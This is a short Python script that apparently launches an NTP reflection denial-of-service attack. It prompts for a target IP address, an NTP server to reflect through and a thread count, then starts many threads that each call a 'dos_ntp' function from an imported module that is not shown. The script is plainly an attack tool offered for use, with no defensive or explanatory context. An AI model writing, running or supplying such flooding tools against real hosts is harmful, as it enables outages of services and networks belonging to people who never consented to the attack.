from ntp import Ntp
import threading

ip = input("Enter the target ip address: ")
fake_ntp = input("Enter a ntp server: ")
number_of_threads = input("Enter the number of threads: ")

data = "dsadas"

threads = []

def multithreading():
    for i in range(int(number_of_threads)):
        t = threading.Thread(target=Ntp.dos_ntp, args=(ip, fake_ntp, data))
        t.daemon = True
        threads.append(t)
    
    for i in range(int(number_of_threads)):
        threads[i].start()
    
    for i in range(int(number_of_threads)):
        threads[i].join()

if Ntp.check_ntp(fake_ntp):
    multithreading()
else:
    Ntp.check_ntp(fake_ntp)